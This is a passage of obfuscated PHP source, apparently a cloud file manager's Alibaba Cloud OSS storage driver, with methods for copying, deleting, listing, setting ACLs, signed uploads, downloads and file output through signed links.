$¥Î§éËÒ[$İ•Ò°¤ƒ[1429]]; $¶ê•ÈÛé = (int) $¥Î§éËÒ[$İ•Ò°¤ƒ[381]] + $Ş¥„Æà° - 1; $ı²œ‚Šö = array($İ•Ò°¤ƒ[1430] => $Ş¥„Æà°, $İ•Ò°¤ƒ[1431] => $¶ê•ÈÛé); $È¯³çä€[] = $this->client->uploadPartCopy($this->bucket, $¨šˆˆÅÂ, $this->bucket, $this->pathEncode($ññäûè), $›ñüúÊË, $´Ä÷é¾, $ı²œ‚Šö); $›ñüúÊË = $›ñüúÊË + 1; } $Ùº½‚’· = array(); foreach ($È¯³çä€ as $ŠşôáØÆ => $ßì–İÄ) { $Ùº½‚’·[] = array($İ•Ò°¤ƒ[1432] => $ŠşôáØÆ + 1, $İ•Ò°¤ƒ[1433] => $ßì–İÄ); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($ññäûè), $´Ä÷é¾, $Ùº½‚’·); } catch (OSS\Core\OssException $ÆñÂØÕ¤) { return !1; } return !0; } public function moveFile($©şÛİÊ, $áÆ¿Øü) { if ($this->copyFile($©şÛİÊ, $áÆ¿Øü)) { $this->remove($©şÛİÊ); return $this->getPathOuter($áÆ¿Øü); } return !1; } public function delFile($øˆÓìÛº) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($øˆÓìÛº)); } catch (OSS\Core\OssException $ïò–ı¢í) { return !1; } return !0; } public function delFolder($ü¯´§á³) { $›òó‘Ô„ =& $_SERVER[³½¬ÚË¯]; if (!$this->exist($ü¯´§á³)) { return !0; } $this->listItemCache = !1; $ÁÏï²â¥ = $this->fileList($ü¯´§á³); $this->listItemCache = !0; $õÀ£äƒü = trim($ü¯´§á³, $›òó‘Ô„[8]) . $›òó‘Ô„[8]; if (!empty($ü¯´§á³) && $ü¯´§á³ !== $›òó‘Ô„[212] && !in_array($õÀ£äƒü, $ÁÏï²â¥[$›òó‘Ô„[82]])) { $ÁÏï²â¥[$›òó‘Ô„[82]][] = $õÀ£äƒü; } $ÂşÂ–‰¯ = $this->delByBatch($ÁÏï²â¥[$›òó‘Ô„[83]]); if (!$ÂşÂ–‰¯) { return !1; } $ÂşÂ–‰¯ = $this->delByBatch($ÁÏï²â¥[$›òó‘Ô„[82]]); if (!$ÂşÂ–‰¯) { return !1; } return $this->delFile($õÀ£äƒü); } private function delByBatch($È£ïå”) { foreach (array_chunk($È£ïå”, 1000) as $é±‹’ñ) { try { $this->client->deleteObjects($this->bucket, $é±‹’ñ); } catch (OSS\Core\OssException $Ü´¾ñ¥Ê) { return !1; } } return !0; } public function rename($§ôÑŸœñ, $¤ƒ—¸¥Á) { return $this->renameObject($§ôÑŸœñ, $¤ƒ—¸¥Á); } private function fileInfo($Ø‹ÊİÕ‚, $ü·„·—ø = false, $Ø¬ïßŞÌ = array()) { $áÙ¨½¸Ê =& $_SERVER[³½¬ÚË¯]; $µåóË ¡ = array($áÙ¨½¸Ê[32] => $this->pathThis($Ø‹ÊİÕ‚), $áÙ¨½¸Ê[84] => $this->getPathOuter($Ø‹ÊİÕ‚), $áÙ¨½¸Ê[33] => $áÙ¨½¸Ê[214], $áÙ¨½¸Ê[76] => isset($Ø¬ïßŞÌ[$áÙ¨½¸Ê[76]]) ? $Ø¬ïßŞÌ[$áÙ¨½¸Ê[76]] : 0, $áÙ¨½¸Ê[175] => $this->ext($Ø‹ÊİÕ‚)); if ($ü·„·—ø) { return $µåóË ¡; } $µåóË ¡[$áÙ¨½¸Ê[215]] = $µåóË ¡[$áÙ¨½¸Ê[85]] = 0; $µåóË ¡[$áÙ¨½¸Ê[216]] = $µåóË ¡[$áÙ¨½¸Ê[217]] = !0; if (empty($Ø¬ïßŞÌ)) { $–—‘ó¡Œ = $this->objectMeta($Ø‹ÊİÕ‚); if (!$–—‘ó¡Œ) { return $µåóË ¡; } $Ø¬ïßŞÌ = array($áÙ¨½¸Ê[85] => strtotime($–—‘ó¡Œ[$áÙ¨½¸Ê[1427]]), $áÙ¨½¸Ê[76] => $–—‘ó¡Œ[$áÙ¨½¸Ê[1426]] + 0, $áÙ¨½¸Ê[1425] => $–—‘ó¡Œ[$áÙ¨½¸Ê[1425]]); } if (isset($Ø¬ïßŞÌ[$áÙ¨½¸Ê[1425]]) && $Ø¬ïßŞÌ[$áÙ¨½¸Ê[1425]]) { $µåóË ¡[$áÙ¨½¸Ê[219]] = trim($Ø¬ïßŞÌ[$áÙ¨½¸Ê[1425]], $áÙ¨½¸Ê[118]); } if (isset($Ø¬ïßŞÌ[$áÙ¨½¸Ê[76]])) { $µåóË ¡[$áÙ¨½¸Ê[76]] = $Ø¬ïßŞÌ[$áÙ¨½¸Ê[76]]; } if (isset($Ø¬ïßŞÌ[$áÙ¨½¸Ê[85]])) { $µåóË ¡[$áÙ¨½¸Ê[85]] = $Ø¬ïßŞÌ[$áÙ¨½¸Ê[85]]; } if (isset($Ø¬ïßŞÌ[$áÙ¨½¸Ê[194]]) && !trim($µåóË ¡[$áÙ¨½¸Ê[85]])) { $µåóË ¡[$áÙ¨½¸Ê[85]] = $Ø¬ïßŞÌ[$áÙ¨½¸Ê[194]]; } return $µåóË ¡; } private function folderInfo($÷©‘–€, $‚íÍœÍü = false, $¦Ô£·²ì = array()) { $¡ò»ïãÕ =& $_SERVER[³½¬ÚË¯]; $ûÆ»²Ùò = array($¡ò»ïãÕ[32] => $this->pathThis($÷©‘–€), $¡ò»ïãÕ[84] => $this->getPathOuter($¡ò»ïãÕ[8] . $÷©‘–€), $¡ò»ïãÕ[33] => $¡ò»ïãÕ[75]); if ($‚íÍœÍü) { return $ûÆ»²Ùò; } $ûÆ»²Ùò[$¡ò»ïãÕ[215]] = $ûÆ»²Ùò[$¡ò»ïãÕ[85]] = 0; $ûÆ»²Ùò[$¡ò»ïãÕ[216]] = $ûÆ»²Ùò[$¡ò»ïãÕ[217]] = !0; if (empty($¦Ô£·²ì)) { $÷©‘–€ = rtrim($÷©‘–€, $¡ò»ïãÕ[8]) . $¡ò»ïãÕ[8]; $ÈşËğØ = $this->objectMeta($÷©‘–€); if (!$ÈşËğØ) { return $ûÆ»²Ùò; } $¦Ô£·²ì = array($¡ò»ïãÕ[215] => $ÈşËğØ[$¡ò»ïãÕ[545]][$¡ò»ïãÕ[1434]], $¡ò»ïãÕ[85] => strtotime($ÈşËğØ[$¡ò»ïãÕ[1427]])); } if (isset($¦Ô£·²ì[$¡ò»ïãÕ[85]])) { $ûÆ»²Ùò[$¡ò»ïãÕ[85]] = $¦Ô£·²ì[$¡ò»ïãÕ[85]]; } if (isset($¦Ô£·²ì[$¡ò»ïãÕ[215]])) { $ûÆ»²Ùò[$¡ò»ïãÕ[215]] = $¦Ô£·²ì[$¡ò»ïãÕ[215]]; } return $ûÆ»²Ùò; } public function listPath($­øôİÔÄ, $úŠ½õÅ… = false) { $ŒêÇ’©Ô =& $_SERVER[³½¬ÚË¯]; $‰¦êÎ¸’ = $this->fileList($­øôİÔÄ, $ŒêÇ’©Ô[8], !0); foreach ($‰¦êÎ¸’[$ŒêÇ’©Ô[82]] as $ˆóœÔ £ => $“ö—ä”—) { $‰¦êÎ¸’[$ŒêÇ’©Ô[82]][$ˆóœÔ £] = $this->folderInfo($“ö—ä”—, $úŠ½õÅ…, $“ö—ä”—); } foreach ($‰¦êÎ¸’[$ŒêÇ’©Ô[83]] as $ˆóœÔ £ => $“ö—ä”—) { $‰¦êÎ¸’[$ŒêÇ’©Ô[83]][$ˆóœÔ £] = $this->fileInfo($“ö—ä”—[$ŒêÇ’©Ô[32]], $úŠ½õÅ…, $“ö—ä”—); } return $‰¦êÎ¸’; } protected function infoChildren($°ĞÁÜàÅ, &$êÎÑÁ¶«) { $ã›˜›À” =& $_SERVER[³½¬ÚË¯]; $û·¨ÒöÚ = $this->fileList($°ĞÁÜàÅ, $ã›˜›À”[12], !0); $êÎÑÁ¶«[$ã›˜›À”[78]] += count($û·¨ÒöÚ[$ã›˜›À”[82]]); $êÎÑÁ¶«[$ã›˜›À”[77]] += count($û·¨ÒöÚ[$ã›˜›À”[83]]); foreach ($û·¨ÒöÚ[$ã›˜›À”[83]] as $…Íç¤²ê) { if (!$…Íç¤²ê || !$…Íç¤²ê[$ã›˜›À”[76]]) { continue; } $êÎÑÁ¶«[$ã›˜›À”[76]] += $…Íç¤²ê[$ã›˜›À”[76]]; } } public function has($‹ö½ïöº, $¢×ŞÏÃ› = false, $ÏÅËÊÑô = true) { $˜şÃ’† =& $_SERVER[³½¬ÚË¯]; $‹ö½ïöº = trim($‹ö½ïöº, $˜şÃ’†[8]); $‚ğöÜÜÕ = empty($‹ö½ïöº) && $‹ö½ïöº !== $˜şÃ’†[212] ? $˜şÃ’†[12] : $‹ö½ïöº . $˜şÃ’†[8]; $˜‰öğñÕ = $˜şÃ’†[12]; $ƒ Úó¿ê = 500; $ÑÀ—– = $Ö¯‘éòµ = 0; while (!0) { check_abort(); $‚ƒ·Îò¼ = array($˜şÃ’†[1421] => $˜şÃ’†[8], $˜şÃ’†[1422] => $‚ğöÜÜÕ, $˜şÃ’†[1423] => $ƒ Úó¿ê, $˜şÃ’†[1424] => $˜‰öğñÕ); try { $û¿Ù­â÷ = $this->client->listObjects($this->bucket, $‚ƒ·Îò¼); } catch (OSS\Core\OssException $²š£Óº) { break; } $˜‰öğñÕ = $û¿Ù­â÷->getNextMarker(); $ñÔœÀÃõ = $û¿Ù­â÷->getObjectList(); $ÒëÛÏ´ı = $û¿Ù­â÷->getPrefixList(); if ($¢×ŞÏÃ›) { if (count($ñÔœÀÃõ) > 1 || count($ñÔœÀÃõ) == 1 && $ñÔœÀÃõ[0]->getKey() != $‚ğöÜÜÕ) { $ÑÀ—– += count($ñÔœÀÃõ) - 1; } if (!empty($ÒëÛÏ´ı)) { $Ö¯‘éòµ += count($ÒëÛÏ´ı); } if ($˜‰öğñÕ === $˜şÃ’†[12]) { break; } continue; } if ($ÏÅËÊÑô) { if (!empty($ñÔœÀÃõ)) { if (count($ñÔœÀÃõ) > 1 || $ñÔœÀÃõ[0]->getKey() != $‚ğöÜÜÕ) { return !0; } } } else { if (!empty($ÒëÛÏ´ı)) { return !0; } } if ($˜‰öğñÕ === $˜şÃ’†[12]) { break; } } if ($¢×ŞÏÃ›) { return array($˜şÃ’†[223] => $ÑÀ—–, $˜şÃ’†[224] => $Ö¯‘éòµ); } return !1; } public function listAll($¨ŸÉ•ß£) { $àÂ½×‡° =& $_SERVER[³½¬ÚË¯]; $›ÖŸâ– = $this->fileList($¨ŸÉ•ß£, $àÂ½×‡°[12], !0); $ÊÅ€Ôé¤ = array_to_keyvalue($›ÖŸâ–[$àÂ½×‡°[83]], $àÂ½×‡°[32]); foreach ($›ÖŸâ–[$àÂ½×‡°[82]] as $·âş˜Š°) { if (is_string($·âş˜Š°)) { $ÊÅ€Ôé¤[$·âş˜Š°] = array($àÂ½×‡°[76] => 0); } } return $this->listAllFiles($¨ŸÉ•ß£, $ÊÅ€Ôé¤); } public function canRead($¾Óñ¥¼ú) { $öÚü—±’ =& $_SERVER[³½¬ÚË¯]; $ºå– = $this->pathAcl($¾Óñ¥¼ú); return $ºå– == $öÚü—±’[1435] || $ºå– == $öÚü—±’[588] ? !0 : !1; } public function canWrite($Œ®­ôÌ) { $Œ«ç¢©Æ = $this->pathAcl($Œ®­ôÌ); return $Œ«ç¢©Æ == $_SERVER[³½¬ÚË¯][588] ? !0 : !1; } public function pathAcl($ê‹î‹’) { $ÙÄ–Ä† =& $_SERVER[³½¬ÚË¯]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $ƒ››¿˜ì = $this->client->getObjectAcl($this->bucket, $this->pathEncode($ê‹î‹’)); } catch (OSS\Core\OssException $µíÅÄ•) { return !1; } $¡ñ“Õ¤¦ = $ƒ››¿˜ì == $ÙÄ–Ä†[37] ? $this->bucketAcl : $ƒ››¿˜ì; if ($¡ñ“Õ¤¦ == $ÙÄ–Ä†[1436]) { return $ÙÄ–Ä†[1435]; } if ($¡ñ“Õ¤¦ == $ÙÄ–Ä†[1437]) { return $ÙÄ–Ä†[588]; } return $¡ñ“Õ¤¦; } private function chmodPath($õºò‘×£, $Óìá„‚İ = '') { $³„ß§ó =& $_SERVER[³½¬ÚË¯]; $ÄøÓµ‰ = empty($Óìá„‚İ) ? $³„ß§ó[1437] : $Óìá„‚İ; $Â£É¬±í = array($³„ß§ó[37], $³„ß§ó[213], $³„ß§ó[1436], $³„ß§ó[1437]); if (!in_array($ÄøÓµ‰, $Â£É¬±í)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($õºò‘×£), $ÄøÓµ‰); } catch (OSS\Core\OssException $íàÀÇš) { return !1; } return !0; } public function getContent($Â¼Â¥§Ø) { return $this->fileSubstr($Â¼Â¥§Ø, -1); } public function setContent($£ë–“¨¡, $óËÃÓê = '') { $’ÊÙñµÕ =& $_SERVER[³½¬ÚË¯]; try { $Ş¸¾¨²Ô = $this->trafficLimit($’ÊÙñµÕ[1438]); $ŒÕ¿ùşŠ = $this->client->putObject($this->bucket, $this->pathEncode($£ë–“¨¡), $óËÃÓê, $Ş¸¾¨²Ô); } catch (OSS\Core\OssException $ÔŞÛ“Ğ›) { return !1; } $Šâß–À³ = array($’ÊÙñµÕ[1428] => trim($ŒÕ¿ùşŠ[$’ÊÙñµÕ[1425]], $’ÊÙñµÕ[118]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($£ë–“¨¡))); $this->updateObjMeta($£ë–“¨¡, $Šâß–À³); return isset($ŒÕ¿ùşŠ[$’ÊÙñµÕ[1439]][$’ÊÙñµÕ[275]]) ? !0 : !1; } private function updateObjMeta($©ºöéªì, $å‹·£©­) { $©ºöéªì = $this->pathEncode($©ºöéªì); try { $‡ˆ´±˜ = array(OSS\OssClient::OSS_HEADERS => $å‹·£©­); $this->client->copyObject($this->bucket, $©ºöéªì, $this->bucket, $©ºöéªì, $‡ˆ´±˜); } catch (OSS\Core\OssException $üâ­Óœ£) { return !1; } return !0; } public function upload($¾…’‘Çà, $—ÖÙˆÀá, $ÆõşÑÉ = false, $­½Ûƒí† = REPEAT_REPLACE) { $¹ŸıÔì =& $_SERVER[³½¬ÚË¯]; $Û ì“‰Š = trim($¾…’‘Çà, $¹ŸıÔì[8]); $¶…¦µ¦ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($¹ŸıÔì[1428] => @md5_file($—ÖÙˆÀá)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($¾…’‘Çà))); $¶…¦µ¦ = $this->trafficLimit($¹ŸıÔì[1438], $¶…¦µ¦); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($Û ì“‰Š), $—ÖÙˆÀá, $¶…¦µ¦); } catch (OSS\Core\OssException $Š¶áË ¬) { return !1; } return $this->getPathOuter($¾…’‘Çà); } public function getHost() { $‚üıÚ Û =& $_SERVER[³½¬ÚË¯]; $÷ŠÖ‘‰¬ = explode($‚üıÚ Û[198], parent::getHost()); return $÷ŠÖ‘‰¬[0] . $‚üıÚ Û[198] . $this->bucket . $‚üıÚ Û[10] . $÷ŠÖ‘‰¬[1]; } public function uploadFormData($Ü ñÃÁ, $áœŸŠÆÇ = 3600) { $ëÌ¦ü²Ë =& $_SERVER[³½¬ÚË¯]; if (!($²—«·” = $this->getHost())) { return !1; } $â¶û©Ê‰ = $áœŸŠÆÇ; $³‡Éô’ü = date($ëÌ¦ü²Ë[1440], time() + $â¶û©Ê‰); $Íù¢¥ğ¬ = new DateTime($³‡Éô’ü); $„ Á»˜· = $Íù¢¥ğ¬->format(DateTime::ISO8601); $êµÊ˜œ¯ = strpos($„ Á»˜·, $ëÌ¦ü²Ë[340]); $„ Á»˜· = substr($„ Á»˜·, 0, $êµÊ˜œ¯) . $ëÌ¦ü²Ë[1441]; $ÒÀÁ¤ Å = 1048576000 * 5; $¹¼Çì€ = $this->pathFather($Ü ñÃÁ); $íİ™•² = array($ëÌ¦ü²Ë[258] => $„ Á»˜·, $ëÌ¦ü²Ë[261] => array(array($ëÌ¦ü²Ë[1442], 0, $ÒÀÁ¤ Å), array($ëÌ¦ü²Ë[264], $ëÌ¦ü²Ë[265], $¹¼Çì€))); $§ÖÏß¤„ = base64_encode(json_encode($íİ™•²)); $¥…×÷¤ = base64_encode(hash_hmac($ëÌ¦ü²Ë[247], $§ÖÏß¤„, $this->secret, !0)); $áÄîàŒ‰ = array($ëÌ¦ü²Ë[276] => $§ÖÏß¤„, $ëÌ¦ü²Ë[1443] => $this->accessKey, $ëÌ¦ü²Ë[268] => $ëÌ¦ü²Ë[257], $ëÌ¦ü²Ë[1444] => $¥…×÷¤, $ëÌ¦ü²Ë[196] => $²—«·”); $áÄîàŒ‰ = $this->trafficLimit($ëÌ¦ü²Ë[1438], $áÄîàŒ‰); return $áÄîàŒ‰; } public function multiUploadFormData($ËÃ¶™‹©, $ŠØıÒé£ = 3600) { $“‰²Îñ =& $_SERVER[³½¬ÚË¯]; if (!($Ãó­Ÿ§ = $this->getHost())) { return !1; } $£Ì½ó“ = $this->trafficLimit($“‰²Îñ[1438]); $·îÕÌÕ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($ËÃ¶™‹©), $£Ì½ó“); return array($“‰²Îñ[238] => $·îÕÌÕ, $“‰²Îñ[196] => $Ãó­Ÿ§ . $“‰²Îñ[8] . $this->pathEncode($ËÃ¶™‹©), $“‰²Îñ[239] => gmdate($“‰²Îñ[1445]), $“‰²Îñ[94] => $ËÃ¶™‹©); } public function multiUploadAuthData($‡ Ó°ª, $‰š£ıÒ‘ = array()) { $‚Ø«¯ñø =& $_SERVER[³½¬ÚË¯]; $»‹ÖÔº = isset($‰š£ıÒ‘[$‚Ø«¯ñø[239]]) ? $‰š£ıÒ‘[$‚Ø«¯ñø[239]] : gmdate($‚Ø«¯ñø[1445]); $ßÆÑÑší = isset($‰š£ıÒ‘[$‚Ø«¯ñø[175]]) ? $‰š£ıÒ‘[$‚Ø«¯ñø[175]] : $‚Ø«¯ñø[12]; $È…Û²‡» = $‡ Ó°ª; if (isset($‰š£ıÒ‘[$‚Ø«¯ñø[94]])) { $È…Û²‡» = $‰š£ıÒ‘[$‚Ø«¯ñø[94]]; unset($‰š£ıÒ‘[$‚Ø«¯ñø[94]]); } if (isset($‰š£ıÒ‘[$‚Ø«¯ñø[240]])) { $‰š£ıÒ‘[$‚Ø«¯ñø[239]] = $»‹ÖÔº; return $this->listUploadParts($È…Û²‡», $‰š£ıÒ‘); } $şßĞæ»’ = array($‚Ø«¯ñø[241], $‚Ø«¯ñø[12], $‚Ø«¯ñø[120], $»‹ÖÔº, "\170\55\157\x73\x73\55\x64\x61\164\145\72{$»‹ÖÔº}", $‚Ø«¯ñø[8] . $this->bucket . $‚Ø«¯ñø[8] . $È…Û²‡» . $ßÆÑÑší); if (strpos($ßÆÑÑší, $‚Ø«¯ñø[242]) === 0) { $şßĞæ»’[0] = $‚Ø«¯ñø[243]; if ($‚„‰ŠÏ = $this->trafficLimit($‚Ø«¯ñø[1438])) { $È…Û²‡» = $‚Ø«¯ñø[1446]; array_splice($şßĞæ»’, 5, 0, $È…Û²‡» . $‚Ø«¯ñø[4] . $‚„‰ŠÏ[$È…Û²‡»]); } } if (isset($‰š£ıÒ‘[$‚Ø«¯ñø[244]]) && $‰š£ıÒ‘[$‚Ø«¯ñø[244]] == $‚Ø«¯ñø[245]) { $şßĞæ»’[0] = $‚Ø«¯ñø[245]; } if (!empty($‰š£ıÒ‘[$‚Ø«¯ñø[1447]])) { $£¾“Œ¿¥ = array_merge(array($şßĞæ»’[4]), $‰š£ıÒ‘[$‚Ø«¯ñø[1447]]); sort($£¾“Œ¿¥); $şßĞæ»’[4] = implode($‚Ø«¯ñø[246], $£¾“Œ¿¥); } $âè×„“ = implode($‚Ø«¯ñø[246], $şßĞæ»’); $»ª˜µş = base64_encode(hash_hmac($‚Ø«¯ñø[247], $âè×„“, $this->secret, !0)); $€±”¶äË = $‚Ø«¯ñø[1411] . $this->accessKey . $‚Ø«¯ñø[4] . $»ª˜µş; if (strpos($ßÆÑÑší, $‚Ø«¯ñø[242]) === 0) { $€±”¶äË = array($‚Ø«¯ñø[249] => $€±”¶äË, $‚Ø«¯ñø[239] => $»‹ÖÔº); if ($‚„‰ŠÏ) { $€±”¶äË = array_merge($€±”¶äË, $‚„‰ŠÏ); } } return $€±”¶äË; } public function listUploadParts($Å¡Ã–õÇ, $Î†á¥Óá) { $µ·¥Ÿ¡ö =& $_SERVER[³½¬ÚË¯]; $–˜­ËÃ = parse_url_query($Î†á¥Óá[$µ·¥Ÿ¡ö[175]]); $à¶¹‰Úä = $this->client->listParts($this->bucket, $this->pathEncode($Å¡Ã–õÇ), $–˜­ËÃ[$µ·¥Ÿ¡ö[238]]); $¦è×İÕ = $à¶¹‰Úä->getListPart(); $ù”÷´»¨ = array(); foreach ($¦è×İÕ as $¤Â®ñ¾‹) { $ù”÷´»¨[] = array($µ·¥Ÿ¡ö[1432] => $¤Â®ñ¾‹->getPartNumber(), $µ·¥Ÿ¡ö[1433] => trim($¤Â®ñ¾‹->getETag(), $µ·¥Ÿ¡ö[118])); } unset($Î†á¥Óá[$µ·¥Ÿ¡ö[240]], $Î†á¥Óá[$µ·¥Ÿ¡ö[244]]); $ÔÇ‚İÓô = $this->multiUploadAuthData($Å¡Ã–õÇ, $Î†á¥Óá); if (empty($ÔÇ‚İÓô)) { return !1; } return array($µ·¥Ÿ¡ö[249] => $ÔÇ‚İÓô, $µ·¥Ÿ¡ö[239] => $Î†á¥Óá[$µ·¥Ÿ¡ö[239]], $µ·¥Ÿ¡ö[251] => $ù”÷´»¨); } public function download($—†õ‰âı, $™¡¦äÕ) { if ($this->isFolder($—†õ‰âı)) { return !1; } try { $œÈÈëù¹ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $™¡¦äÕ); $œÈÈëù¹ = $this->trafficLimit($_SERVER[³½¬ÚË¯][109], $œÈÈëù¹); $this->client->getObject($this->bucket, $this->pathEncode($—†õ‰âı), $œÈÈëù¹); } catch (OSS\Core\OssException $¯­¿ó¦ô) { return !1; } return $™¡¦äÕ; } public function fileSubstr($ä¡¥Âë°, $ˆÙÉê» = 0, $‚ò†ëèë = false) { if ($ˆÙÉê» === -1) { $€ÆÆÅşŞ = array(); } else { if ($‚ò†ëèë === !1) { $ğíî¸Õº = $this->size($ä¡¥Âë°); } else { $ğíî¸Õº = $ˆÙÉê» + $‚ò†ëèë - 1; } $€ÆÆÅşŞ = array(OSS\OssClient::OSS_RANGE => "{$ˆÙÉê»}\x2d{$ğíî¸Õº}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($ä¡¥Âë°), $€ÆÆÅşŞ); } catch (OSS\Core\OssException $£¡»ñƒ¤) { think_exception($£¡»ñƒ¤->getMessage()); return !1; } } private function trafficLimit($«ŸÒÍ‡¡, $·‘øœæ = array()) { $â©¢ï¥Ã =& $_SERVER[³½¬ÚË¯]; if ($«ŸÒÍ‡¡ == $â©¢ï¥Ã[1438] && $this->isUploadServer() || $«ŸÒÍ‡¡ == $â©¢ï¥Ã[109] && $this->isFileOutServer()) { return $·‘øœæ; } $õ­ê–ĞË = floatval($GLOBALS[$â©¢ï¥Ã[6]][$â©¢ï¥Ã[89]][$â©¢ï¥Ã[107]][$«ŸÒÍ‡¡]) * 1024 * 1024 * 8; if (!$õ­ê–ĞË) { return $·‘øœæ; } $õ­ê–ĞË = $õ­ê–ĞË < 819200 ? 819200 : ($õ­ê–ĞË > 838860800 ? 838860800 : $õ­ê–ĞË); $·‘øœæ[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($õ­ê–ĞË); return $·‘øœæ; } public function link($ìÄÔÅˆ, $²±ş‚î» = array()) { $Ï·ª“û¦ =& $_SERVER[³½¬ÚË¯]; if (!$this->exist($ìÄÔÅˆ) || $this->isFolder($ìÄÔÅˆ)) { return !1; } try { $²±ş‚î» = $this->trafficLimit($Ï·ª“û¦[109], $²±ş‚î»); $™¹œ¢– = $this->client->signUrl($this->bucket, $this->pathEncode($ìÄÔÅˆ), 3600 * 12, $Ï·ª“û¦[245], $²±ş‚î»); return $this->getCdnLink($™¹œ¢–); } catch (OSS\Core\OssException $¨¡£òæƒ) { return !1; } } public function fileOut($º±Í¾×Ä, $Àï‹Â½® = false, $Œ˜·ÏÅ¤ = false, $¸ë×®ëù = '') { $ó¼á…¸Â =& $_SERVER[³½¬ÚË¯]; if ($this->isFileOutServer()) { return $this->fileOutServer($º±Í¾×Ä, $Àï‹Â½®, $Œ˜·ÏÅ¤, $¸ë×®ëù); } if (!$Œ˜·ÏÅ¤) { $Œ˜·ÏÅ¤ = $this->pathThis($º±Í¾×Ä); } $Œ˜·ÏÅ¤ = rawurlencode($Œ˜·ÏÅ¤); $–‡ÔÚóó = get_file_mime(get_path_ext($Œ˜·ÏÅ¤)); if ($–‡ÔÚóó == $ó¼á…¸Â[232]) { return parent::fileOut($º±Í¾×Ä, $Àï‹Â½®, $Œ˜·ÏÅ¤, $¸ë×®ëù); } $Àï‹Â½® = $Àï‹Â½® ? $ó¼á…¸Â[1448] : $ó¼á…¸Â[1449]; $¨¡ƒ­ì = array(OSS\OssClient::OSS_SUB_RESOURCE => $ó¼á…¸Â[1450] . rawurlencode("{$Àï‹Â½®}\73\x66\x69\x6c\x65\156\x61\155\145\x3d{$Œ˜·ÏÅ¤}")); $¨¡ƒ­ì[OSS\OssClient::OSS_SUB_RESOURCE] .= $ó¼á…¸Â[1451] . rawurlencode($–‡ÔÚóó); $ˆ‘‘î¬‚ = $this->link($º±Í¾×Ä, $¨¡ƒ­ì); $this->fileOutLink($ˆ‘‘î¬‚); } public function fileOutServer($åÒºÖà, $ˆ×ø¡øô = false, $ê­øŸú = false, $¹¨·²›¨ = '') { parent::fileOut($åÒºÖà, $ˆ×ø¡øô, $ê­øŸú, $¹¨·²›¨); } public function fileOutImage($“ª·Ô, $åƒ øÌ× = 250) { if ($this->size($“ª·Ô) > 1024 * 1024 * 20) { return $this->fileOutImageServer($“ª·Ô, $åƒ øÌ×); } $«Î¶Ø•é = array(OSS\OssClient::OSS_PROCESS => $_SERVER[³½¬ÚË¯][1452] . $åƒ øÌ×); $ùŠÆ°Ò = $this->link($“ª·Ô, $«Î¶Ø•é); $this->fileOutLink($ùŠÆ°Ò); } public function fileOutImageServer($êõ™ÑÖ”, $Úğ¯‰áÔ = 250) { parent::fileOutImage($êõ™ÑÖ”, $Úğ¯‰áÔ); } public function fileOutLink($‘ò·ï œ) { $ğ‚§Ø€¯ =& $_SERVER[³½¬ÚË¯]; if (!$this->isCdnHost() && substr($‘ò·ï œ, 0, 7) == $ğ‚§Ø€¯[1373]) { $‘ò·ï œ = $ğ‚§Ø€¯[1374] . substr($‘ò·ï œ, 7); } header($ğ‚§Ø€¯[162] . $‘ò·ï œ); die; } public function hashMd5($¡Ï¾Íµ¸, $ªïëëµå = '') { $ø°×’‹ò =& $_SERVER[³½¬ÚË¯]; $¾Ë­¹óÃ = $this->_objectMeta($¡Ï¾Íµ¸); if (!$¾Ë­¹óÃ) { return $ø°×’‹ò[12]; } if (!isset($¾Ë­¹óÃ[$ø°×’‹ò[1428]]) && !empty($ªïëëµå)) { $ÛàÜ© è = $this->updateObjMeta($¡Ï¾Íµ¸, array($ø°×’‹ò[1428] => $ªïëëµå)); $¾Ë­¹óÃ[$ø°×’‹ò[1428]] = $ÛàÜ© è ? $ªïëëµå : $ø°×’‹ò[12]; } return isset($¾Ë­¹óÃ[$ø°×’‹ò[1428]]) ? strtolower($¾Ë­¹óÃ[$ø°×’‹ò[1428]]) : $ø°×’‹ò[12]; } public function size($•ÇáËŠ¬) { $À”¨ÓÄ = $this->objectMeta($•ÇáËŠ¬); return $À”¨ÓÄ ? $À”¨ÓÄ[$_SERVER[³½¬ÚË¯][76]] : 0; } public function info($ø¤ÉÃ„Î) { if ($this->isFolder($ø¤ÉÃ„Î)) { return $this->folderInfo($ø¤ÉÃ„Î); } else { if ($this->isFile($ø¤ÉÃ„Î)) { return $this->fileInfo($ø¤ÉÃ„Î); } } return !1; } public function exist($ì“Ñˆš‹) { return $this->isFile($ì“Ñˆš‹) || $this->isFolder($ì“Ñˆš‹); } public function isFile($µ·ŞÖÀ) { return !$this->isFolder($µ·ŞÖÀ) && $this->objectMeta($µ·ŞÖÀ); } public function isFolder($£­ï¡”ë) { return $this->cacheMethod($_SERVER[³½¬ÚË¯][166], $£­ï¡”ë); } protected function objectMeta($°£ÇÆĞ“) { return $this->cacheMethod($_SERVER[³½¬ÚË¯][168], $°£ÇÆĞ“); } protected function _objectMeta($¸—ÂÕËã) { $¡»Î´Åé =& $_SERVER[³½¬ÚË¯]; try { $äó£ö£Ã = $this->client->getObjectMeta($this->bucket, $this->pathEncode($¸—ÂÕËã)); } catch (OSS\Core\OssException $Î·µæşÆ) { $äó£ö£Ã = !1; } if ($äó£ö£Ã) { $äó£ö£Ã[$¡»Î´Åé[76]] = intval($äó£ö£Ã[$¡»Î´Åé[1426]]); } return $äó£ö£Ã; } protected function _isFolder($ğÛÉĞÎÂ) { $òÛÑšĞ =& $_SERVER[³½¬ÚË¯]; if ($ğÛÉĞÎÂ == $òÛÑšĞ[12] || $ğÛÉĞÎÂ == $òÛÑšĞ[8]) { return !0; } $ÆÅ’š”§ = array($òÛÑšĞ[1421] => $òÛÑšĞ[8], $òÛÑšĞ[1422] => rtrim($ğÛÉĞÎÂ, $òÛÑšĞ[8]) . $òÛÑšĞ[8], $òÛÑšĞ[1423] => 1, 